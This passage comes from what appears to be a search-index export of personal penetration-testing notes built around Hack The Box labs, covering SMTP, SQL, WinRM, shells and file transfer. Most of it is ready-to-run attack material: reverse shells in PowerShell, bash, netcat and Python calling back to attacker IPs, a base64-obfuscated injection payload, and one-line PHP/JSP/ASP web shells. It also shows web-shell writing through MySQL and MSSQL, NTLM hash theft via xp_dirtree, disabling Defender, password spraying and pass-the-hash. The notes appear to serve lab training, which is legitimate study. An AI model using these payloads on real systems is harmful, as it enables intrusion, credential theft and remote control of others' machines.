&lt;user&gt; -p &lt;pssword&gt; -x &lt;command&gt; --exec-method smbexec\n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt; password&gt; -d &lt;domain&gt;\n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt; password&gt; -local-auth\n\n# PTH\n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -d &lt;domain&gt; -H ':&lt;hash&gt;' \n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -H ':&lt;hash&gt;' --local-auth\n</code></pre>"},{"location":"zNew/Services/SMTP/","title":"SMTP","text":""},{"location":"zNew/Services/SMTP/#delete","title":"delete","text":""},{"location":"zNew/Services/SMTP/#interacting","title":"Interacting","text":"<pre><code>$ telnet 10.129.14.128 25\n</code></pre>"},{"location":"zNew/Services/SMTP/#send-an-email","title":"Send an Email","text":"<pre><code>$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server\n\n\nEHLO inlanefreight.htb\n\n250-mail1.inlanefreight.htb\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n\n\nMAIL FROM: &lt;cry0l1t3@inlanefreight.htb&gt;\n\n250 2.1.0 Ok\n\n\nRCPT TO: &lt;mrb3n@inlanefreight.htb&gt; NOTIFY=success,failure\n\n250 2.1.5 Ok\n\n\nDATA\n\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n\nFrom: &lt;cry0l1t3@inlanefreight.htb&gt;\nTo: &lt;mrb3n@inlanefreight.htb&gt;\nSubject: DB\nDate: Tue, 28 Sept 2021 16:32:51 +0200\nHey man, I am trying to access our XY-DB but the creds don't work. \nDid you make any changes there?\n.\n\n250 2.0.0 Ok: queued as 6E1CF1681AB\n\n\nQUIT\n\n221 2.0.0 Bye\nConnection closed by foreign host.\n</code></pre>"},{"location":"zNew/Services/SMTP/#footprinting-the-service","title":"Footprinting the Service","text":""},{"location":"zNew/Services/SMTP/#nmap","title":"Nmap","text":"<pre><code>$ sudo nmap &lt;IP&gt; -sC -sV -p25`\n</code></pre>"},{"location":"zNew/Services/SMTP/#nmap-open-relay","title":"Nmap - Open Relay","text":"<pre><code>$ sudo nmap &lt;IP&gt; -p25 --script smtp-open-relay -v`\n</code></pre>"},{"location":"zNew/Services/SMTP/#attacking-email-services","title":"Attacking Email Services","text":""},{"location":"zNew/Services/SMTP/#host-mx-records","title":"Host - MX Records","text":"<pre><code>$ host -t MX hackthebox.eu\n</code></pre>"},{"location":"zNew/Services/SMTP/#dig-mx-records","title":"DIG - MX Records","text":"<pre><code>$ dig mx inlanefreight.com | grep \"MX\" | grep -v \";\"\n</code></pre>"},{"location":"zNew/Services/SMTP/#host-a-records","title":"Host - A Records","text":"<pre><code>COR33@htb[/htb]$ host -t A mail1.inlanefreight.htb.\n</code></pre> <pre><code>COR33@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7\n</code></pre>"},{"location":"zNew/Services/SMTP/#o365-spray","title":"O365 Spray","text":"<pre><code>COR33@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz\n</code></pre> <p>Now, we can attempt to identify usernames.</p> <pre><code>COR33@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        \n</code></pre>"},{"location":"zNew/Services/SMTP/#password-attacks","title":"Password Attacks","text":""},{"location":"zNew/Services/SMTP/#hydra-password-attack","title":"Hydra - Password Attack","text":"<pre><code>COR33@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3\n</code></pre>"},{"location":"zNew/Services/SMTP/#o365-spray-password-spraying","title":"O365 Spray - Password Spraying","text":"<pre><code>COR33@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz\n</code></pre>"},{"location":"zNew/Services/SNMP/","title":"SNMP","text":""},{"location":"zNew/Services/SNMP/#delete","title":"delete","text":""},{"location":"zNew/Services/SNMP/#footprinting","title":"Footprinting","text":"<pre><code># SNMPwalk\n$ snmpwalk -v2c -c public &lt;IP&gt;\n\n# OneSixtyOne\n$ sudo apt install onesixtyone\n$ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt;\n\n\"\"\"\nOnce we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.\n\"\"\"\n\n# Braa\n$ sudo apt install braa\n$ braa &lt;community strings&gt;@&lt;IP&gt;:.1.3.6.*\n</code></pre>"},{"location":"zNew/Services/SQL/","title":"SQL","text":""},{"location":"zNew/Services/SQL/#delete","title":"delete","text":""},{"location":"zNew/Services/SQL/#mysql","title":"MySQL","text":""},{"location":"zNew/Services/SQL/#interaction","title":"Interaction","text":"<pre><code>$ mysql -u root -h &lt;IP&gt;\n$ mysql -u root -pP4SSw0rd -h &lt;IP&gt; -P 3306\n</code></pre> Command Description show databases; Show all databases. use ; Select one of the existing databases. show tables; Show all available tables in the selected database. show columns from ; Show all columns in the selected database. select * from ; Show everything in the desired table. select * from  where  = \"\"; Search for the needed string in the desired table."},{"location":"zNew/Services/SQL/#footprinting","title":"Footprinting","text":"<pre><code>$ sudo nmap &lt;IP&gt; -sV -sC -p3306 --script mysql*\n</code></pre>"},{"location":"zNew/Services/SQL/#write-local-file","title":"Write Local File","text":"<pre><code>mysql&gt; SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php';\n\nQuery OK, 1 row affected (0.001 sec)\n</code></pre> <p>In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT \u2026 INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.</p> <p>secure_file_priv may be set as follows:</p> <ul> <li>If empty, the variable has no effect, which is not a secure setting.</li> <li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li> <li>If set to NULL, the server disables import and export operations.</li> </ul> <p>In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:</p>"},{"location":"zNew/Services/SQL/#read-local-files","title":"Read Local Files","text":"<pre><code>mysql&gt; select LOAD_FILE(\"/etc/passwd\");\n</code></pre>"},{"location":"zNew/Services/SQL/#secure-file-privileges","title":"Secure File Privileges","text":"<pre><code>mysql&gt; show variables like \"secure_file_priv\";\n\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n\n1 row in set (0.005 sec)\n</code></pre>"},{"location":"zNew/Services/SQL/#mssql","title":"MSSQL","text":""},{"location":"zNew/Services/SQL/#interaction_1","title":"Interaction","text":"<pre><code>$ mysql -u julio -pPassword123 -h &lt;IP&gt;\n$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth\n$ mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n$ mssqlclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n\n$ sqsh -S &lt;IP&gt; -U julio -P 'MyPassword!' -h\n\n&gt; sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30\n</code></pre> Command Description SELECT name FROM master.dbo.sysdatabases; Show all databases. USE htbusers Select one of the existing databases. SELECT * FROM .INFORMATION_SCHEMA.TABLES; Show all available tables in the selected database. SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES SELECT * FROM Employees.dbo.employee_information; Show everything in the desired table."},{"location":"zNew/Services/SQL/#footprinting_1","title":"Footprinting","text":""},{"location":"zNew/Services/SQL/#nmap-mssql-script-scan","title":"NMAP MSSQL Script Scan","text":"<pre><code>$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248\n</code></pre>"},{"location":"zNew/Services/SQL/#mssql-ping-in-metasploit","title":"MSSQL Ping in Metasploit","text":"<pre><code>$ msf6 auxiliary(scanner/mssql/mssql_ping)\n</code></pre>"},{"location":"zNew/Services/SQL/#enumeration","title":"Enumeration","text":"<p>By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a \"hidden\" mode, it uses the TCP/2433 port. We can use Nmap's default scripts -sC option to enumerate database services on a target system:</p>"},{"location":"zNew/Services/SQL/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>$ nmap -Pn -sV -sC -p1433 10.10.10.125\n</code></pre>"},{"location":"zNew/Services/SQL/#execute-commands","title":"Execute Commands","text":"<ul> <li>xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing sp_configure</li> <li>The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account</li> <li>xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed</li> </ul>"},{"location":"zNew/Services/SQL/#xp_cmdshell","title":"XP_CMDSHELL","text":"<p>enable_xp_cmdshell</p> <pre><code>1&gt; xp_cmdshell 'whoami'\n2&gt; GO\n\nxp_cmdshell whoami /priv\n\noutput\n-----------------------------\nno service\\mssql$sqlexpress\nNULL\n(2 rows affected)\n</code></pre>"},{"location":"zNew/Services/SQL/#enable-xp_cmdshell","title":"Enable XP_CMDSHELL","text":"<p>If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:</p> <pre><code>-- To allow advanced options to be changed.  \nEXECUTE sp_configure 'show advanced options', 1\nGO\n\n-- To update the currently configured value for advanced options.  \nRECONFIGURE\nGO  \n\n-- To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1\nGO  \n\n-- To update the currently configured value for this feature.  \nRECONFIGURE\nGO\n</code></pre>"},{"location":"zNew/Services/SQL/#write-local-files","title":"Write Local Files","text":"<p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p>"},{"location":"zNew/Services/SQL/#mssql-enable-ole-automation-procedures","title":"MSSQL - Enable Ole Automation Procedures","text":"<pre><code>1&gt; sp_configure 'show advanced options', 1\n2&gt; GO\n3&gt; RECONFIGURE\n4&gt; GO\n5&gt; sp_configure 'Ole Automation Procedures', 1\n6&gt; GO\n7&gt; RECONFIGURE\n8&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#create-a-file","title":"Create a File","text":"<pre><code>1&gt; DECLARE @OLE INT\n2&gt; DECLARE @FileID INT\n3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\n4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\n5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET[\"c\"]);?&gt;'\n6&gt; EXECUTE sp_OADestroy @FileID\n7&gt; EXECUTE sp_OADestroy @OLE\n8&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#read-local-files_1","title":"Read Local Files","text":"<pre><code>1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n2&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#capture-mssql-service-hash","title":"Capture MSSQL Service Hash","text":"<p>We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p> <p>To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:</p>"},{"location":"zNew/Services/SQL/#xp_dirtree-hash-stealing","title":"XP_DIRTREE Hash Stealing","text":"<pre><code>1&gt; EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'\n2&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#xp_subdirs-hash-stealing","title":"XP_SUBDIRS Hash Stealing","text":"<pre><code>1&gt; EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'\n2&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#xp_subdirs-hash-stealing-with-responder","title":"XP_SUBDIRS Hash Stealing with Responder","text":"<pre><code>$ sudo responder -I tun0\n</code></pre>"},{"location":"zNew/Services/SQL/#xp_subdirs-hash-stealing-with-impacket","title":"XP_SUBDIRS Hash Stealing with impacket","text":"<pre><code>$ sudo impacket-smbserver share ./ -smb2support\n</code></pre>"},{"location":"zNew/Services/SQL/#impersonate-existing-users-with-mssql","title":"Impersonate Existing Users with MSSQL","text":""},{"location":"zNew/Services/SQL/#identify-users-that-we-can-impersonate","title":"Identify Users that We Can Impersonate","text":"<pre><code>1&gt; SELECT distinct b.name\n2&gt; FROM sys.server_permissions a\n3&gt; INNER JOIN sys.server_principals b\n4&gt; ON a.grantor_principal_id = b.principal_id\n5&gt; WHERE a.permission_name = 'IMPERSONATE'\n6&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#verifying-our-current-user-and-role","title":"Verifying our Current User and Role","text":"<pre><code>1&gt; SELECT SYSTEM_USER\n2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')\n3&gt; go\n</code></pre>"},{"location":"zNew/Services/SQL/#impersonating-the-sa-user","title":"Impersonating the SA User","text":"<pre><code>1&gt; EXECUTE AS LOGIN = 'sa'\n2&gt; SELECT SYSTEM_USER\n3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')\n4&gt; GO\n</code></pre> <p><code>Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.</code></p>"},{"location":"zNew/Services/SQL/#communicate-with-other-databases-with-mssql","title":"Communicate with Other Databases with MSSQL","text":""},{"location":"zNew/Services/SQL/#identify-linked-servers-in-mssql","title":"Identify linked Servers in MSSQL","text":"<pre><code>1&gt; SELECT srvname, isremote FROM sysservers\n2&gt; GO\n</code></pre> <pre><code>1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]\n2&gt; GO\n</code></pre>"},{"location":"zNew/Services/SQL/#postgres","title":"POSTGRES","text":"<ul> <li><code>psql -h 127.0.0.1 -U postgres</code> - Connect DB</li> <li><code>\\l</code> - List all databases</li> <li><code>\\c \u201cdb\u201d;</code> - Select DB</li> <li><code>\\dt;</code> - List all tables</li> <li><code>Select * from users;</code> - Dump table data</li> </ul>"},{"location":"zNew/Services/SSH/","title":"SSH","text":""},{"location":"zNew/Services/SSH/#delete","title":"delete","text":""},{"location":"zNew/Services/SSH/#interacting","title":"Interacting","text":"<pre><code>$ ssh &lt;USEr&gt;@&lt;IP&gt;\n\n# id_rsa\n$ ssh -i id_rsa &lt;USER&gt;@&lt;IP&gt;  \n</code></pre>"},{"location":"zNew/Services/SSH/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/SSH/#nmap-ssh","title":"Nmap SSH","text":""},{"location":"zNew/Services/WINRM/","title":"WINRM","text":""},{"location":"zNew/Services/WINRM/#delete","title":"delete","text":""},{"location":"zNew/Services/WINRM/#interacting","title":"Interacting","text":""},{"location":"zNew/Services/WINRM/#connecting","title":"Connecting","text":"<pre><code># ClearPassword\n$ evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;\n\n# PTH\n$ evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt;\n</code></pre>"},{"location":"zNew/Services/WINRM/#session-from-windows","title":"Session from Windows","text":"<pre><code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\n$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)\nEnter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred\n</code></pre>"},{"location":"zNew/Services/WINRM/#download","title":"Download","text":"<pre><code>PS &gt; download &lt;file&gt;\n</code></pre>"},{"location":"zNew/Services/WINRM/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/WINRM/#nmap-winrm","title":"Nmap WinRM","text":"<pre><code>$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n\n</code></pre>"},{"location":"zNew/Services/WMI/","title":"Interacting","text":"<pre><code>$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"\n</code></pre>"},{"location":"zNew/Shell/Shell/","title":"Shell","text":""},{"location":"zNew/Shell/Shell/#delete","title":"delete","text":""},{"location":"zNew/Shell/Shell/#shell","title":"Shell","text":""},{"location":"zNew/Shell/Shell/#listening-shell","title":"LISTENING SHELL","text":"<ul> <li><code>nc -lnvp 9999</code></li> </ul>"},{"location":"zNew/Shell/Shell/#reverse-shell","title":"Reverse Shell","text":"<p>With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.</p> <p>If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target</p>"},{"location":"zNew/Shell/Shell/#windows","title":"Windows","text":"<pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.15.60',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <ul> <li>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</li> </ul>"},{"location":"zNew/Shell/Shell/#disable-av","title":"Disable AV","text":"<pre><code>Set-MpPreference -DisableRealtimeMonitoring $true\n</code></pre>"},{"location":"zNew/Shell/Shell/#sh-files","title":"sh files","text":"<pre><code>#!\\bin/bash \n\nsh -i &gt;&amp; /dev/tcp/10.10.14.5/9999 0&gt;&amp;1\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.5 9999 &gt;/tmp/fs\n</code></pre>"},{"location":"zNew/Shell/Shell/#execute-reverse-shell-file","title":"Execute Reverse Shell File","text":"<pre><code># Transfir File to Target\n$ curl &lt;MY_IP&gt;:&lt;MY_PORT&gt;/bash.sh -o /tmp/bash.sh\n$ wget &lt;MY_IP&gt;:&lt;MY_PORT&gt;/bash.sh \n\n# Execute Shell\n$ ./tmp/bash.sh\n$ bash /tmp/bash.sh\n</code></pre>"},{"location":"zNew/Shell/Shell/#pyton","title":"Pyton","text":"<pre><code>$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre>"},{"location":"zNew/Shell/Shell/#upload-php-file-that-works-like-a-page","title":"Upload PHP file that works like a page","text":"<p><code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</code> </p>"},{"location":"zNew/Shell/Shell/#payloads-ci","title":"Payloads CI","text":"<pre><code># Convert reverse shell to base64\n$ echo 'sh -i &gt;&amp; /dev/tcp/10.10.14.8/9999 0&gt;&amp;1' | base64\n\n# Send the payload\n$ echo${IFS}\"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5IDA+JjEK\"|base64${IFS}-d|bash\n\n# Execute reverse shell\n$ bash -c(\"sh -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1\")\n$ curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.60/443 0&gt;&amp;1\"'`\n$ bash -c 'sh -i &gt;%26 /dev/tcp/10.10.14.5/9999 0&gt;%261'`\n</code></pre>"},{"location":"zNew/Shell/Shell/#bind-shells","title":"Bind Shells","text":"<p>With a bind shell, the target system has a listener started and awaits a connection from a pentester's system.</p> <pre><code>bash\n$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f\n\n# Connect Attack\n$ nc -nv 10.129.41.200 7777\n</code></pre>"},{"location":"zNew/Shell/Shell/#web-shells","title":"Web Shells","text":"<p><code>copy from /usr/share/laudanum</code></p>"},{"location":"zNew/Shell/Shell/#php","title":"PHP","text":"<pre><code>&lt;?php SYSTEM($_REQUEST['cmd']); ?&gt;\n</code></pre>"},{"location":"zNew/Shell/Shell/#aspx-antak-webshell","title":"ASPX Antak Webshell","text":"<p><code>copy from /usr/share/nishang/Antak-WebShell</code></p> <p>Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.</p>"},{"location":"zNew/Shell/Shell/#jsp","title":"JSP","text":"<pre><code>&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;\n</code></pre>"},{"location":"zNew/Shell/Shell/#asp","title":"ASP","text":"<pre><code>&lt;% eval request(\"cmd\") %&gt;\n</code></pre>"},{"location":"zNew/Shell/Shell/#war","title":"War","text":"<p>java/war (Tomcat, Axis2, or WebLogic)</p> <pre><code>$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp\n$ zip -r backup.war cmd.jsp \n</code></pre>"},{"location":"zNew/Shell/Shell/#interactive-shells","title":"Interactive Shells","text":"<pre><code># Python\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\"CTRL+Z\"\nstty raw -echo; fg\nexport TERM=xterm\n\n# /bin/sh -i\n/bin/sh -i\n\n# Perl\nperl \u2014e 'exec \"/bin/sh\";'\n\n## The command should be run from a script.\nperl: exec \"/bin/sh\";\n\n\n# Ruby\n## The command should be run from a script.\nruby: exec \"/bin/sh\"\n\n\n# Lua\n## The command should be run from a script.\nlua: os.execute('/bin/sh')\n\n\n# AWK\nawk 'BEGIN {system(\"/bin/sh\")}'\n\n\n# Find\nfind / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;\n\n\n# Using Exec To Launch A Shell\nfind . -exec /bin/sh \\; -quit\n\n# VIM\nvim -c ':!/bin/sh'\n\n\n# Vim Escape\nvim\n:set shell=/bin/sh\n:shell\n</code></pre>"},{"location":"zNew/Shell/Shell/#generate-ssh-key","title":"Generate SSH Key","text":""},{"location":"zNew/Shell/Shell/#victim","title":"Victim","text":"<pre><code>$ ssh-keygen\n$ cd ./ssh\n$ cat id_rsa.pub &gt; authorized_keys\n$ chmod 700 ~/\n$ chmod 700 ~/.ssh\n$ chmod 600 ~/.ssh/authorized_key\n</code></pre>"},{"location":"zNew/Shell/Shell/#host","title":"Host","text":"<pre><code>$ nano id_rsa\n(Copy from id_rsa victim)\n$ chmod 400 id_rsa\n$ ssh -i id_rsa matt@10.10.11.136\n</code></pre>"},{"location":"zNew/Shell/Shell/#passphrase","title":"PassPhrase","text":"<pre><code>$ python3 /usr/share/john/ssh2john.py id_rsa &gt; hash.txt\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n$ john --show hash.txt\n</code></pre>"},{"location":"zNew/TransferFiles/FilesoverHTTP/","title":"FilesoverHTTP","text":""},{"location":"zNew/TransferFiles/FilesoverHTTP/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/FilesoverHTTP/#catching-files-over-https","title":"Catching Files over HTTP/S","text":""},{"location":"zNew/TransferFiles/FilesoverHTTP/#nginx-enabling-put","title":"Nginx - Enabling PUT","text":"<p>When allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. Apache makes it easy to shoot ourselves in the foot with this, as the PHP module loves to execute anything ending in PHP. Configuring Nginx to use PHP is nowhere near as simple.</p> <p>Create a Directory to Handle Uploaded Files</p> <pre><code>$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory\n</code></pre> <p>Change the Owner to www-data</p> <pre><code>$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\n</code></pre> <p>Create Nginx Configuration File</p> <pre><code>nano /etc/nginx/sites-available/upload.conf\n\nserver {\n    listen 9001;\n\n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n</code></pre> <p>Symlink our Site to the sites-enabled Directory</p> <pre><code>$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\n</code></pre> <p>Start Nginx</p> <pre><code>$ sudo systemctl restart nginx.service\n</code></pre> <p>If we get any error messages, check /var/log/nginx/error.log</p> <p>Verifying Errors</p> <pre><code>$ tail -2 /var/log/nginx/error.log\n\n2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: Address already in use`)\n2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()\n</code></pre> <pre><code>$ ss -lnpt | grep 80\n\nLISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:((\"python\",pid=`2811`,fd=3),(\"python\",pid=2070,fd=3),(\"python\",pid=1968,fd=3),(\"python\",pid=1856,fd=3))\n</code></pre> <pre><code>$ ps -ef | grep 2811\n\nuser65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`\nroot        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811\n</code></pre> <p>Remove NginxDefault Configuration</p> <pre><code>$ sudo rm /etc/nginx/sites-enabled/default\n</code></pre> <p>Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt</p> <p>Upload File Using cURL</p> <pre><code>$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt\n</code></pre> <pre><code>$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt \n\nuser65:x:1000:1000:,,,:/home/user65:/bin/bash\n</code></pre> <p>Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.</p>"},{"location":"zNew/TransferFiles/Linux/","title":"Linux","text":""},{"location":"zNew/TransferFiles/Linux/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/Linux/#open-server","title":"OPEN SERVER:","text":""},{"location":"zNew/TransferFiles/Linux/#python","title":"PYTHON:","text":"<ul> <li><code>python3 -m http.server 1234</code> local machine</li> </ul>"},{"location":"zNew/TransferFiles/Linux/#wget","title":"WGET","text":"<ul> <li><code>wget http://10.10.14.1:8000/linenum.sh</code> target machine</li> <li><code>curl http://10.10.14.1:8000/linenum.sh -o</code> linenum.sh</li> </ul>"},{"location":"zNew/TransferFiles/Linux/#scp","title":"SCP","text":"<ul> <li><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> local machine</li> </ul>"},{"location":"zNew/TransferFiles/Linux/#attack-to-target","title":"Attack to Target","text":""},{"location":"zNew/TransferFiles/Linux/#base64-encoding-decoding","title":"Base64 Encoding / Decoding","text":"<p>Encode SSH Key to Base64</p> <pre><code>$ cat id_rsa |base64 -w 0;echo`\n</code></pre> <p>Decode the File</p> <pre><code>$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; shell`\n</code></pre> <p>Confirm the MD5 Hashes Match</p> <pre><code>$ md5sum id_rsa\n</code></pre>"},{"location":"zNew/TransferFiles/Linux/#web-downloads-with-wget-and-curl","title":"Web Downloads with Wget and cURL","text":"<p>Download a File Using wget</p> <pre><code>$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`\n</code></pre> <p>Download a File Using cURL</p> <pre><code>$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`\n</code></pre>"},{"location":"zNew/TransferFiles/Linux/#fileless-attacks-using-linux","title":"Fileless Attacks Using Linux","text":"<p>Fileless Download with cURL</p> <pre><code>$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`\n</code></pre> <p>Fileless Download with wget</p> <pre><code>$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`\n</code></pre>"},{"location":"zNew/TransferFiles/Linux/#download-with-bash-devtcp","title":"Download with Bash (/dev/tcp)","text":"<p>Connect to the Target Webserver</p> <pre><code>$ exec 3&lt;&gt;/dev/tcp/10.10.10.32/80`\n</code></pre> <p>HTTP GET Request</p> <pre><code>$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3`\n</code></pre> <p>Print the Response</p> <pre><code>$ cat &lt;&amp;3`\n</code></pre>"},{"location":"zNew/TransferFiles/Linux/#ssh-downloads","title":"SSH Downloads","text":"<p>SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH 